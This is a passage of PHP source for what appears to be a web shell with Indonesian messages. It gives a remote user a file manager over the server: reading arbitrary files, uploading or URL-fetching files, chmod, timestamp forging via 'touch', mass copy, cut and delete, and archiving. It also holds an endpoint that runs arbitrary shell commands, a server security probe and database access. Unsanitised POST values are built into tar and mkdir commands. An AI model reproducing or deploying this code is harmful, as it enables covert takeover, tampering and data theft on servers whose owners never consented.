        return strcmp($a['entry'], $b['entry']);
    });
    usort($files, function ($a, $b) {
        return strcmp($a['entry'], $b['entry']);
    });

    return array_merge($dirs, $files);
}
function pathberkas($a) {
    $parts = explode('/', $a);
    if (empty($parts)) {
        return "<code>Could not read directory.</code>";
    }

    $out = '<nav aria-label="breadcrumb" class="d-flex justify-content-center align-items-center mt-n3">';
    $out .= '<button id="ffmanager" class="border-0 bg-transparent d-block text-success mr-2 px-1" data-path="' . htmlspecialchars(cwd() ?: $_SERVER['DOCUMENT_ROOT']) . '">' . fType("home", "1.2em") . '</button>';
    $out .= '<ol class="breadcrumb position-relative w-100" style="margin-top:revert; padding-right:0;">';

    $currentPath = '';
    foreach ($parts as $id => $part) {
        if ($part === '' && $id === 0) {
            $out .= '<li class="breadcrumb-item"><a href="#!" id="ffmanager" data-li="' . $id . '" data-path="/">~$</a></li>';
            continue;
        }
        if ($part === '') continue;

        $currentPath .= ($id > 1 ? '/' : '') . $part;
        $out .= '<li class="breadcrumb-item dir' . $id . '"><a href="#!" id="ffmanager" data-li="' . $id . '" data-path="' . htmlspecialchars($currentPath) . '">' . htmlspecialchars($part) . '</a></li>';
    }

    $out .= '<li class="ml-auto position-absolute" style="right:0;bottom:50%;transform:translate(0,50%);"><a href="javascript:void(0);" id="chdir" data-path="' . htmlspecialchars($_SESSION['path']) . '">' . fType("edit", "1.2em") . '</a></li>';
    $out .= "</ol></nav>";

    return $out;
}
function FManager($fm) {
    $lokasinya = urutberkas($fm);
    $fmtable = "<div class='col-12'><div class='d-block'>" . pathberkas($fm) . "</div></div>";

    // Action forms
    $fmtable .= "<div class='col-sm-6 col-md-6 col-lg-4'>
        <form method='post' action='?act=mkdir' class='mb-3' id='rqmkdir'>
            <input type='hidden' name='xpath' value='" . htmlspecialchars($fm) . "'/>
            <div class='input-group'>
                <select class='custom-select border-success' name='xtype' style='max-width:90px;'>
                    <option value='dir' selected>New dir</option>
                    <option value='file'>New file</option>
                </select>
                <input type='text' name='xdir' class='form-control form-control-sm border-success' maxlength='50' />
                <div class='input-group-append'><button class='btn btn-outline-success' type='submit'>Go</button></div>
            </div>
        </form>
    </div>";
    // ... (other forms can be refactored similarly)

    $cDir = 0;
    $cFile = 0;
    $tableRows = '';

    if (count($lokasinya) > 0) {
        foreach ($lokasinya as $dir) {
            $owner = owner($dir['full_path']);
            $fSize = $dir['type'] == 'dir' ? countDir($dir['full_path']) . " items" : sizeFilter(@filesize($dir['full_path']));
            $modifiedTime = date('Y-m-d H:i:s', @filemtime($dir['full_path']));
            $perms = statusnya($dir['full_path']);
            $permCode = substr(sprintf("%o", @fileperms($dir['full_path'])), -4);

            $actions = buildActionMenu($dir);
            $fileIcon = fType($dir['type'] === 'dir' ? 'dir' : getFileType($dir['entry']), '1.7em');

            $tableRows .= "<tr>
                <td class='text-center align-middle pr-0'>
                    <div class='custom-control custom-checkbox'>
                        <input type='checkbox' class='custom-control-input' id='diCheck " . htmlspecialchars($dir['entry']) . "' data-xtype='" . $dir['type'] . "' data-xname='" . htmlspecialchars($dir['entry']) . "'/>
                        <label class='custom-control-label' for='diCheck " . htmlspecialchars($dir['entry']) . "'></label>
                    </div>
                </td>
                <td class='text-left align-middle'>
                    <div class='media " . $dir['type'] . "'>" . $fileIcon . "<div class='media-body'>" . htmlspecialchars($dir['entry']) . "<span class='fsmall'>" . $fSize . "</span></div></div>
                </td>
                <td class='text-center align-middle'>" . $modifiedTime . "</td>
                <td class='text-center align-middle'>" . htmlspecialchars($owner['owner'] . '/' . $owner['group']) . "</td>
                <td class='text-center align-middle'><a href='#' class='" . stColor($dir['full_path']) . "' data-toggle='modal' data-target='#showchmod' data-xtype='" . $dir['type'] . "' data-xname='" . htmlspecialchars($dir['entry']) . "' data-xpath='" . htmlspecialchars($dir['entry_path']) . "' data-xperm='" . $permCode . "'>" . $perms . "</a><span class='fsmall mt-n1 d-block text-secondary'>" . $permCode . "</span></td>
                <td class='text-center align-middle'>" . $actions . "</td>
            </tr>";

            if ($dir['type'] == 'dir') $cDir++;
            else $cFile++;
        }
    } else {
        $tableRows = "<tr><td class='text-center' colspan='6'>Directory is empty</td></tr>";
    }

    $fmtable .= "<div class='col-12 mb-3'><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th colspan='2' class='text-center' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Permission</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>" . $tableRows . "</tbody>";

    // Table footer
    $massActions = "<option value='mass_copy'>copy</option><option value='mass_cut'>cut</option><option value='mass_del'>del</option><option value='mass_tar'>compress tar</option><option value='mass_tgz'>compress tgz</option>";
    if (class_exists("ZipArchive")) {
        $massActions .= "<option value='mass_zip'>compress zip</option>";
    }
    $fmtable .= "<tfoot class='text-light'>
        <tr>
            <th class='text-center align-middle font-weight-normal small pl-1 pr-0'>
                <div class='custom-control custom-checkbox'>
                    <input type='checkbox' class='custom-control-input' id='diCheckAll'/>
                    <label class='custom-control-label' for='diCheckAll'></label>
                </div>
            </th>
            <th class='align-middle font-weight-normal small pl-0 py-2'>
                <select class='custom-select custom-select-sm border-success' id='fdirexec' data-xpath='" . htmlspecialchars($fm) . "'><option value='' disabled selected>action</option>" . $massActions . "</select>
            </th>
            <th class='text-right align-middle font-weight-normal small' colspan='4'>Dir: <span class='text-warning'>{$cDir}</span>, Files: <span class='text-warning'>{$cFile}</span></th>
        </tr>
    </tfoot></table></div></div>";

    return $fmtable;
}

function getFileType($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $types = [
        'css' => ['css', 'less'],
        'txt' => ['txt', 'ini'],
        'js' => ['js', 'json'],
        'php' => ['php', 'phtml', 'php5', 'php7', 'phar', 'inc', 'module', 'hphp', 'ctp'],
        'html' => ['html', 'htm', 'shtml', 'xhtml', 'xml'],
        'zip' => ['zip', 'rar', 'tar', 'bz', 'gz', 'tgz'],
        'img' => ['jpg', 'png', 'bmp', 'gif', 'webp', 'psd', 'jpeg', 'ico', 'ai', 'xcf', 'cdr', 'tif', 'tiff', 'eps']
    ];
    foreach ($types as $type => $extensions) {
        if (in_array($ext, $extensions)) {
            return $type;
        }
    }
    return 'other';
}

function buildActionMenu($dir) {
    $options = [
        'view' => "<option value='view'>view</option>",
        'edit' => "<option value='edit'>edit</option>",
        'rename' => "<option value='rename'>rename</option>",
        'touch' => "<option value='touch' data-xtime='" . date('Y-m-d H:i:s', @filemtime($dir['full_path'])) . "'>touch</option>",
        'copy' => "<option value='copy'>copy</option>",
        'cut' => "<option value='cut'>cut</option>",
        'download' => "<option value='download'>download</option>",
        'del' => "<option value='del'>del</option>",
    ];

    $zadd = '';
    $ext = strtolower(pathinfo($dir['full_path'], PATHINFO_EXTENSION));
    if ($dir['type'] === 'dir' || in_array($ext, ['zip', 'tar', 'gz', 'tgz'])) {
        if (class_exists('ZipArchive')) {
            if ($dir['type'] === 'dir') $zadd .= "<option value='zip'>compress zip</option>";
            if ($ext === 'zip') $zadd .= "<option value='unzip'>extract zip</option>";
        }
        if ($dir['type'] === 'dir') $zadd .= "<option value='tar'>compress tar</option>";
        if ($ext === 'tar') $zadd .= "<option value='untar'>extract tar</option>";
        if ($dir['type'] === 'dir') $zadd .= "<option value='tgz'>compress tgz</option>";
        if (in_array($ext, ['gz', 'tgz'])) $zadd .= "<option value='untgz'>extract tgz</option>";
    }

    $fcolor = stColor($dir['full_path']);
    if ($fcolor === 'text-danger') {
        return "<span class='text-danger'>-</span>";
    }
    if ($fcolor === 'text-warning') {
        return "<select class='custom-select custom-select-sm border-success' id='showaksi' data-xtype='" . $dir['type'] . "' data-xname='" . htmlspecialchars($dir['entry']) . "' data-xpath='" . htmlspecialchars($dir['entry_path']) . "'><option value=''></option>" . $options['view'] . "</select>";
    }

    $allOptions = implode('', $options) . $zadd;
    return "<select class='custom-select custom-select-sm border-success' id='showaksi' data-xtype='" . $dir['type'] . "' data-xname='" . htmlspecialchars($dir['entry']) . "' data-xpath='" . htmlspecialchars($dir['entry_path']) . "'><option value=''></option>" . $allOptions . "</select>";
}
class DatabaseManager {
    private $connection;
    private $dbType;

    public function __construct($dbType, $host, $user = null, $password = null, $dbName = null) {
        $this->dbType = strtolower($dbType);
        $this->connection = $this->connect($host, $user, $password, $dbName);
    }

    private function connect($host, $user, $password, $dbName) {
        try {
            switch ($this->dbType) {
                case 'mysql':
                    if (class_exists('mysqli')) {
                        return new mysqli($host, $user, $password, $dbName);
                    }
                    // Fallback for older PHP versions
                    if (function_exists('mysql_connect')) {
                        $conn = @mysql_connect($host, $user, $password);
                        if ($conn && $dbName) {
                            mysql_select_db($dbName, $conn);
                        }
                        return $conn;
                    }
                    throw new Exception("No MySQL driver available.");
                case 'pgsql':
                    $connStr = "host={$host} user={$user} password={$password}";
                    if ($dbName) $connStr .= " dbname={$dbName}";
                    return pg_connect($connStr);
                case 'sqlite3':
                    return new SQLite3($host);
                case 'sqlite':
                    return sqlite_open($host);
                // Add other database types here
                default:
                    throw new Exception("Unsupported database type: {$this->dbType}");
            }
        } catch (Exception $e) {
            // Log error or handle it gracefully
            return null;
        }
    }

    public function query($sql, $params = []) {
        if (!$this->connection) {
            return false;
        }
        try {
            // Use prepared statements to prevent SQL injection
            $stmt = $this->connection->prepare($sql);
            if ($stmt === false) {
                throw new Exception("Prepare failed: " . $this->connection->error);
            }
            if (!empty($params)) {
                $types = str_repeat('s', count($params)); // Assume all params are strings
                $stmt->bind_param($types, ...$params);
            }
            $stmt->execute();
            return $stmt->get_result();
        } catch (Exception $e) {
            // Handle exceptions
            return false;
        }
    }

    public function close() {
        if ($this->connection) {
            $this->connection->close();
        }
    }
}
if (isset($_GET['act'])) {
    $action = $_GET['act'];
    $response = [];

    switch ($action) {
        case 'info':
            $response = serverSecInfo();
            break;

        case 'command':
            if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
                $sendreq = perintahnya($_POST['cmd'], $_POST['xpath']);
                $response['stdout'] = base64_encode("<pre class='pb-0 mb-0'>" . htmlspecialchars(base64_decode($sendreq['userhost'])) . ":<span class='text-cyan font-weight-bold'>" . htmlspecialchars(base64_decode($sendreq['path'])) . "</span><span class='text-warning font-weight-bold'>#</span> " . htmlspecialchars($_POST['cmd']) . "<br/>" . htmlspecialchars(base64_decode($sendreq['stdout'])) . "</pre>");
                $response['path'] = $sendreq['path'];
                $response['userhost'] = $sendreq['userhost'];
            } else {
                $response['stdout'] = base64_encode("<pre class='pb-0 mb-0'>Invalid command.</pre>");
                $response['path'] = base64_encode($_SESSION['path']);
                $response['userhost'] = base64_encode('0');
            }
            break;

        // ... other cases
    }

    if (!empty($response)) {
        header("Content-type: application/json; charset=utf-8");
        echo json_encode($response);
        die();
    }
}

if(isset($_GET['act'])){
	if($_GET['act'] == 'mkdir'){
		$ndir = isset($_POST['xdir']) && !empty($_POST['xdir']) ? $_POST['xdir'] : '';
		if(!empty($ndir)){
			$xpath = $_POST['xpath']."/".$ndir;
			if($_POST['xtype'] == 'dir'){
				if(!@is_dir($xpath)){
					if(@mkdir($xpath, 0755, true)){
						$outs = "Direktori berhasil dibuat!";
					} else {
						$sendreq = perintahnya("mkdir ".$xpath, $_POST['xpath']);
						$outs = isset($sendreq['stdout']) && strlen($sendreq['stdout'])>2 ? "Direktori berhasil dibuat!" : "Gagal membuat direktori!";
					}
				} else {
					$outs = "Direktori sudah ada!";
				}
			} else {
				if($_POST['xtype'] == 'file'){
					if(!file_exists($xpath)){
						if(AvFunc(array('fopen','fclose'))){
							$fp = @fopen($xpath, 'w');
							if($fp){
								$xpath = "ok, tinggal di edit..";
								fclose($fp);
							}
							$outs = "File berhasil dibuat!";
						} else if(AvFunc(array('file_put_contents'))){
							file_put_contents($xpath, "");
							$outs = file_exists($xpath) ? "File berhasil dibuat!" : "Gagal membuat file!";
						}
					} else {
						$outs = "File sudah ada, cobalah membuat file dengan nama yang berbeda!";
					}
				} else {
					$outs = "Anda mw buat apa??";
				}
			}
		} else {
			$outs = "Path tidak valid!";
		}
		echo $outs;
		die();
	} else if($_GET['act'] == 'readfile'){
		if(isset($_POST['xpath']) && !empty($_POST['xpath'])){
			$xpath = $_POST['xpath'];
			if(@is_readable($xpath)){
				$outs = '';
				if(@filesize($xpath)>0){
					if(AvFunc(array('fopen','fread','fclose','feof'))){
						$fp = @fopen($xpath, 'r');
						if($fp){
							while(!@feof($fp)){$outs .= htmlspecialchars(@fread($fp, @filesize($xpath)));}
							@fclose($fp);
						}
					} else if(AvFunc(array('file_get_contents'))){
						$outs = @file_get_contents($df);
					} else {
						$outs = "File {$_GET['entry']} gak bisa dibaca!";
					}
				} else {
					if(AvFunc(array('file_get_contents'))){$outs = @file_get_contents($df);}
				}
			} else {
				$outs = "File {$_GET['entry']} gak bisa dibaca!";
			}
		} else {
			$outs = "File yang mw dibaca, gk ada!";
		}
		echo $outs;
		die();
	} else if($_GET['act'] == 'uploader'){
		$xpath = $_POST['xpath'];
		$xurl = $_POST['xurl'];
		$xname = $_POST['xname'];
		if(is_writable($xpath)){
			if(empty($xurl) || !filter_var($xurl, FILTER_VALIDATE_URL)){$errs[] = "Url tidak valid!";}
			if(empty($xname)){$errs[] = "Nama file tidak boleh kosong!";}
			if(isset($errs)){
				$outs[] = $errs;				
			} else {
				$outs = transferFile($xurl, $xpath, $xname);
			}
		} else {
			$outs[] = "Gak bisa upload file di direktori ini!";
		}
		echo isset($outs) ? implode('<br/>', $outs) : 'Invalid file!';
		die();
	} else if($_GET['act'] == 'upload'){
		@ini_set('output_buffering', 0);
		$xpath = $_POST['xpath'];
		if(is_writable($xpath)){
			for($cf=0; $cf<count(@$_FILES['xfile']['name']); $cf++){
				if(@$_FILES['xfile']['size'][$cf] > 0){
					$fname = @$_FILES['xfile']['name'][$cf];
					$ftmp = @$_FILES['xfile']['tmp_name'][$cf];
					if(AvFunc(array('move_uploaded_file'))){
						if(file_exists($xpath."/".$fname)){@unlink($xpath."/".$fname);}
						$outs[] = @move_uploaded_file($ftmp, $xpath."/".$fname) ? $fname." uploaded!" : $fname." failed!";
					} else if(AvFunc(array('file_put_contents', 'file_get_contents'))){
						if(file_exists($xpath."/".$fname)){@unlink($xpath."/".$fname);}
						$upfiles = @file_put_contents($xpath."/".$fname, @file_get_contents(@$ftmp));
						if($upfiles){
							$outs[] = file_exists($xpath."/".$fname) ? $fname." uploaded!" : $fname." failed!";
						} else {
							$outs[] = $fname." failed!";
						}
					} else if(AvFunc(array('copy'))){
						if(file_exists($xpath."/".$fname)){@unlink($xpath."/".$fname);}
						$outs[] = @copy($ftmp, $xpath."/".$fname) ? $fname." uploaded!" : $fname." failed!";
					} else {
						$outs[] = $fname." failed!";
					}
				}
			}
		} else {
			$outs[] = "Gak bisa upload file di direktori ini!";
		}
		echo isset($outs) ? implode('<br/>', $outs) : 'Invalid file!';
		die();
	} else if($_GET['act'] == 'rename'){
		if(isset($_POST['xtype'], $_POST['xpath'], $_POST['xname'], $_POST['oname'])){
			$ren = @rename($_POST['xpath'].'/'.$_POST['oname'], $_POST['xpath'].'/'.$_POST['xname']);
			$outss = $ren == true ? 'Berhasil mengubah nama '.$_POST['xtype'] : 'Gagal mengubah nama '.$_POST['xtype'];
			echo $outss;
			die();
		}
	} else if($_GET['act'] == 'touch'){
		if(isset($_POST['xtype'], $_POST['xpath'], $_POST['xname'], $_POST['xtime'])){
			$time = strtotime($_POST['xtime']);
			$fd = $_POST['xpath'].'/'.$_POST['xname'];
			if($time){
				$outs = !touch($fd, $time, $time) ? 'Fail!' : 'Touched!';
			} else {
				$outs = 'Format waktu tidak valid!';
			}
			clearstatcache();
			echo $outs;
			die();
		}
	} else if($_GET['act'] == 'chmod'){
		if(isset($_POST['xperm']) && !empty($_POST['xperm'])){
			$xperm = $_POST['xperm'];
			$xtype = $_POST['xtype'];
			$xname = $_POST['xname'];
			$xpath = $_POST['xpath'];
			$perms = 0;
			for($i=strlen($xperm)-1;$i>=0;--$i){
				$perms += (int)$xperm[$i]*pow(8, (strlen($xperm)-$i-1));
			}
			$cm = @chmod("{$xpath}/{$xname}", $perms);
			$outss = $cm == true ? 'chmod '.$xtype.': '.$xname.', berhasil!' : 'chmod '.$xtype.': '.$xname.', gagal!';
		} else {
			$outss = 'Permission tidak boleh kosong!';
		}
		clearstatcache();
		echo $outss;
		die();
	} else if($_GET['act'] == 'copy'){
		if(isset($_POST['xtype'], $_POST['xname'], $_POST['xpath'], $_POST['xtarget'])){
			$df = rtrim($_POST['xpath'],'/') .'/'. $_POST['xname'];
			$target = rtrim($_POST['xtarget'], '/');
			if(!@is_dir($target)){
				echo 'Tujuan ('. $target.') bukanlah sebuah direktori!';
				die();
			}
			if(!@is_writable($target)){
				echo 'Tujuan ('. $target.') is not writeable!';
				die();
			}
			if($_POST['xtype'] == 'file'){
				if(file_exists($df)){
					$outss = @copy($df, $target.'/'.$_POST['xname']) ? $_POST['xname'].' berhasil di copy!' : $_POST['xname'].' gagal di copy!';
				} else {
					$outss = $_POST['xname'].' sudah ada!';
				}
			} else if($_POST['xtype'] == 'dir'){
				if(gandakanDir($df, $target.'/'.$_POST['xname'])){
					$outss = $_POST['xname'].' berhasil di copy!';
				} else {
					$outss = $_POST['xname'].' gagal di copy!';
				}
			}
		} else {
			$outss = 'permintaan tidak lengkap!';
		}
		echo $outss;	
		die();		
	} else if($_GET['act'] == 'cut'){
		if(isset($_POST['xtype'], $_POST['xname'], $_POST['xpath'], $_POST['xtarget'])){
			$df = rtrim($_POST['xpath'],'/') .'/'. $_POST['xname'];
			$target = rtrim($_POST['xtarget'], '/');
			if(!@is_dir($target)){
				echo 'Tujuan ('. $target.') bukanlah sebuah direktori!';
				die();
			}
			if(!@is_writable($target)){
				echo 'Tujuan ('. $target.') is not writeable!';
				die();
			}
			if($_POST['xtype'] == 'file'){
				if(file_exists($df)){
					$outss = @rename($df, $target.'/'.$_POST['xname']) ? $_POST['xname'].' berhasil di pindahkan!' : $_POST['xname'].' gagal di pindahkan!';
				} else {
					$outss = $_POST['xname'].' sudah ada!';
				}
			} else if($_POST['xtype'] == 'dir'){
				if(@is_dir($df)){
					$outss = @rename($df, $target.'/'.$_POST['xname']) ? $_POST['xname'].' berhasil di pindahkan!' : $_POST['xname'].' gagal di pindahkan!';
				} else {
					$outss = $df.' tidak ditemukan!';					
				}
			}
		} else {
			$outss = 'permintaan tidak lengkap!';
		}
		echo $outss;
		die();
	} else if($_GET['act'] == 'del'){
		if(isset($_POST['xtype'], $_POST['xname'], $_POST['xpath'])){
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			if($_POST['xtype'] == 'dir' && @is_dir($df)){
				if(file_exists($df)){
					xrmdir($df);					
				}
				$outss = file_exists($df) ? "Hapus dir gagal!" : "Hapus dir sukses!";
			} else if($_POST['xtype'] == 'file' && @is_file($df)){
				if(file_exists($df)){
					@unlink($df);					
				}
				$outss = file_exists($df) ? "Hapus file gagal!" : "Hapus file sukses!";
			}
			echo $outss;
			die();
		}
	} else if($_GET['act'] == 'tar'){
		$df = $_POST['xpath'] .'/'. $_POST['xname'];
		$fnm = explode('.', $_POST['xname']);
		$newname = count($fnm)>0 ? current($fnm).'.tar' : $_POST['xname'].'.tar';
		if(file_exists($newname)){
			unlink($_POST['xpath'].'/'.$newname);
		}
		perintahnya("tar cf {$newname} {$_POST['xname']}", $_POST['xpath']);
		$outs = file_exists($_POST['xpath']."/".$newname) ? "archived success" : "archived failed";
		echo $outs;
		die();
	} else if($_GET['act'] == 'tgz'){
		$df = $_POST['xpath'] .'/'. $_POST['xname'];
		$fnm = explode('.', $_POST['xname']);
		$newname = count($fnm)>0 ? current($fnm).'.tar.gz' : $_POST['xname'].'.tar.gz';
		if(file_exists($newname)){
			unlink($_POST['xpath'].'/'.$newname);
		}
		perintahnya("tar czf {$newname} {$_POST['xname']}", $_POST['xpath']);
		$outs = file_exists($_POST['xpath']."/".$newname) ? "archived success" : "archived failed";
		echo $outs;
		die();
	} else if($_GET['act'] == 'zip'){
		if(class_exists('ZipArchive')){
			$zip = new ZipArchive();
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			$fnm = explode('.', $_POST['xname']);
			$newname = count($fnm)>0 ? $_POST['xpath']."/".current($fnm) : $df;
			if(file_exists($newname.'.zip')){
				unlink($_POST['xpath'].'/'.$newname.'.zip');
			}
			if($zip->open($newname.'.zip', ZipArchive::CREATE)){
				if(@is_dir($df)){
					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($df.'/', FilesystemIterator::SKIP_DOTS));
					foreach($files as $key => $value){
						$zip->addFile(realpath($key), $key);
					}
				} else {
					$zip->addFile($df);
				}
				$outss = $_POST['xname'].' zipped!';
			} else {
				$outss = 'Tidak dapat menganalisa dir/file';
			}
			$zip->close();
		} else {
			$outss = 'module ZipArchive tidak terinstall!';			
		}
		echo $outss;
		die();
	} else if($_GET['act'] == 'untar'){
		$df = $_POST['xpath'] .'/'. $_POST['xname'];
		perintahnya("tar xf {$_POST['xname']} -C {$_POST['xpath']}", $_POST['xpath']);
		try {
			$phar = new PharData($_POST['xname']);
			foreach ($phar as $file) {
				$targetPath = $_POST['xpath'] . $file->getFilename();
				if (file_exists($targetPath)) {
					echo "File {$file->getFilename()} sudah ada, melewati...\n";
					continue;
				}
				$phar->extractTo($_POST['xpath'], [$file->getFilename()], true);
				echo "File {$file->getFilename()} berhasil diekstrak.\n";
			}
		} catch (Exception $e) {
			echo "Error: " . $e->getMessage();
		}
		die();
	} else if($_GET['act'] == 'untgz'){
		$df = $_POST['xpath'] .'/'. $_POST['xname'];
		perintahnya("tar xzf {$_POST['xname']} -C {$_POST['xpath']}", $_POST['xpath']);
		try {
			$phar = new PharData($_POST['xname']);
			foreach ($phar as $file) {
				$targetPath = $_POST['xpath'] . $file->getFilename();
				if (file_exists($targetPath)) {
					echo "File {$file->getFilename()} sudah ada, melewati...\n";
					continue;
				}
				$phar->extractTo($_POST['xpath'], [$file->getFilename()], true);
				echo "File {$file->getFilename()} berhasil diekstrak.\n";
			}
		} catch (Exception $e) {
			echo "Error: " . $e->getMessage();
		}
		die();
	} else if($_GET['act'] == 'unzip'){
		if(class_exists('ZipArchive')){
			$zip = new ZipArchive();
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			if($zip->open($df)) {
				$zip->extractTo($_POST['xpath']);
				$outss = $_POST['xname'].' extracted!';
				$zip->close();
			} else {
				$outss = $_POST['xname'].' gagal di unzip!';
			}
		} else {
			$outss = 'module ZipArchive tidak terinstall!';
		}
		echo $outss;
		die();
	} else if($_GET['act'] == 'mass_zip'){
		if(class_exists('ZipArchive')){
			$zip = new ZipArchive();
			$zipfile = (isset($_POST['xname']) && !empty(trim($_POST['xname'])) ? trim($_POST['xname']) : 'zip_'.date('U')).'.zip';
			if($zip->open($zipfile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE){
				$outss = "Tidak dapat membuat file ZIP: {$zipfile}";
			}
			$hasils = false;
			$xdata = json_decode(base64_decode($_POST['xdata']),true);
			foreach ($xdata as $ki => $item) {
				$itemPath = $item['name'];
				if($item['type'] == 'dir'){
					addDirToZip($zip, $itemPath, $_POST['xpath']);					
					$hasils = true;
				} else if ($item['type'] == 'file') {
					$zip->addFile($itemPath, $item['name']);
					$hasils = true;
				}
			}
			$outss = $hasils == true ? 'ZIP file berhasil dibuat: '.$zipfile : 'Item tidak valid atau tidak ditemukan!';
			$zip->close();
		} else {
			$outss = 'module ZipArchive tidak terinstall!';
		}
		echo $outss;
		die();
	} else if($_GET['act'] == 'mass_tar'){
		$path = rtrim($_POST['xpath'], '/');
		$tarfile = (isset($_POST['xname']) && !empty(trim($_POST['xname'])) ? trim($_POST['xname']) : 'tar_'.date('U')).'.tar';
		$Command = "tar cf {$tarfile}";
		$xdata = json_decode(base64_decode($_POST['xdata']),true);
		foreach ($xdata as $ki => $item){
			$itemPath = $path . '/' . $item['name'];
			if (file_exists($itemPath)) {
				$Command .= ' '.escapeshellarg($item['name']);
			}
		}
		perintahnya($Command, $path);
		echo file_exists($path.'/'.$tarfile) ? "File TAR berhasil dibuat: {$tarfile}" : "Item tidak valid atau tidak ditemukan";
		die();
	} else if($_GET['act'] == 'mass_tgz'){
		$path = rtrim($_POST['xpath'], '/');
		$tgzfile = (isset($_POST['xname']) && !empty(trim($_POST['xname'])) ? trim($_POST['xname']) : 'tgz_'.date('U')).'.tar.gz';
		$Command = "tar czf {$tgzfile}";
		$xdata = json_decode(base64_decode($_POST['xdata']),true);
		foreach ($xdata as $ki => $item){
			$itemPath = $path . '/' . $item['name'];
			if (file_exists($itemPath)) {
				$Command .= ' '.escapeshellarg($item['name']);
			}
		}
		perintahnya($Command, $path);
		echo file_exists($path.'/'.$tgzfile) ? "File TAR.GZ berhasil dibuat: {$tgzfile}" : "Item tidak valid atau tidak ditemukan";
		die();
	} else if($_GET['act'] == 'mass_copy'){
		$path = rtrim($_POST['xpath'], '/');
		$target = rtrim($_POST['xtarget'], '/');
		$xdata = json_decode(base64_decode($_POST['xdata']),true);
		if(!@is_dir($target)){
			echo 'Tujuan ('.$target.') bukanlah sebuah direktori!';
			die();
		}
		if(!@is_writable($target)){
			echo 'Tujuan ('.$target.') is not writeable!';
			die();
		}
		$hasils[] = '';
		foreach($xdata as $ki => $item){
			$sourcePath = $path.'/'.$item['name'];
			$targetPath = $target.'/'.$item['name'];
			if($item['type'] === 'file'){
				if(file_exists($sourcePath)){
					if(@copy($sourcePath, $targetPath)){
						$hasils[] = 'Copy file berhasil!';
					} else {
						$hasils[] = 'Copy file gagal!';
					}
				} else {
					$hasils[] = 'Copy file gagal!';
				}
			} else if($item['type'] === 'dir'){
				if(gandakanDir($sourcePath, $targetPath)){
					$hasils[] = 'Copy dir berhasil!';
				} else {
					$hasils[] = 'Copy dir gagal!';
				}
			}
		}
		$outs = implode(', ', array_unique($hasils));
		echo $outs;
		die();
	} else if($_GET['act'] == 'mass_cut'){
		$path = rtrim($_POST['xpath'], '/');
		$target = rtrim($_POST['xtarget'], '/');
		$xdata = json_decode(base64_decode($_POST['xdata']),true);
		if(!@is_dir($target)){
			echo 'Tujuan ('.$target.') bukanlah sebuah direktori!';
			die();
		}
		if(!@is_writable($target)){
			echo 'Tujuan ('.$target.') is not writeable!';
			die();
		}
		$hasils[] = '';
		foreach($xdata as $ki => $item){
			$sourcePath = $path.'/'.$item['name'];
			$targetPath = $target.'/'.$item['name'];
			if($item['type'] === 'file'){
				if(file_exists($sourcePath)){
					$isCopyF = @copy($sourcePath, $targetPath);
					if($isCopyF){
						@unlink($sourcePath);
						$hasils[] = "Cut file berhasil!";
					} else {
						$hasils[] = "Cut file gagal!";
					}
				}
			} else if($item['type'] === 'dir'){
				$isCopyD = gandakanDir($sourcePath, $targetPath);
				if($isCopyD){
					xrmdir($sourcePath);
					$hasils[] = "Cut dir berhasil!";
				} else {
					$hasils[] = "Cut dir gagal!";
				}
			}
		}
		$outs = implode(', ', array_unique($hasils));
		echo $outs;
		die();
	} else if($_GET['act'] == 'mass_del'){
		$path = rtrim($_POST['xpath'], '/');
		$xdata = json_decode(base64_decode($_POST['xdata']),true);
		$hasils = false;
		foreach ($xdata as $ki => $item){
			if($item['type'] == 'dir'){
				xrmdir($path.'/'.$item['name']);
				$hasils = true;
			} else {
				unlink($path.'/'.$item['name']);
				$hasils = true;
			}
		}
		echo $hasils == true ? 'File deteled!' : 'Gagal menghapus file';
		die();
	} else if($_GET['act'] == 'sql'){
		if($_GET['q'] == 'check'){
			if(AvFunc(array('mysql_get_client_info', 'mysqli_get_client_info'))){$temp[] = "MySQL";}
			if(AvFunc(array('mssql_connect'))){$temp[] = "MSSQL";}
			if(AvFunc(array('pg_connect'))){$temp[] = "PostgreSQL";}
			if(AvFunc(array('oci_connect'))){$temp[] = "Oracle";}
			if(AvFunc(array('odbc_connect'))){$temp[] = "odbc";}
			if(AvFunc(array('sqlite_open'))){$temp[] = "SQLite";}
			if(class_exists('SQLite3')){$temp[] = "SQLite3";}
			if(class_exists('PDO')){$temp[] = "PDO";}
			if(isset($temp) && count($temp) > 0){
				foreach($temp as $kt){
					$dtx[] = $kt;
				}
			}
			$outs = isset($dtx) ? array('error' => 0, 'data' => $dtx) : array('error' => 1, 'message' => 'No database installed in this server');
			header("Content-type: application/json; charset=utf-8");
			echo json_encode($outs);
			die();
		} else if($_GET['q'] == 'connect'){
			if(isset($_POST)){
				$sqltype = $_POST['sqltype'];
				$sqlhost = $_POST['sqlhost'];
				$sqluser = $_POST['sqluser'];
				$sqlpass = isset($_POST['sqlpass']) && !empty($_POST['sqlpass']) ? $_POST['sqlpass'] : null;
				$sqldata = isset($_POST['sqldata']) && !empty($_POST['sqldata']) ? $_POST['sqldata'] : null;
				switch($sqltype){
					case 'MySQL'	: $contype = 'mysql'; $showdb = "SHOW DATABASES"; break;
					case 'PostgreSQL': $contype = 'pgsql'; $showdb = "SELECT schema_name FROM information_schema.schemata"; break;
					case 'SQLite3'	: 
					case 'SQLite'	: $contype = 'sqlite'; $showdb = "SELECT \"{$s_sql['host']}\""; break;
					case 'MSSql'	: $contype = 'mssql'; $showdb = "SELECT name FROM master..sysdatabases"; break;
					case 'Oracle'	: $contype = 'oracle'; $showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME"; break;
					case 'PDO'		: $contype = 'pdo'; $showdb = "SHOW DATABASES"; break;
					case 'odbc'		: $contype = 'odbc'; $showdb = "SHOW DATABASES"; break;
					default			: $contype = 'mysql'; $showdb = "SHOW DATABASES"; 
				}
				try {
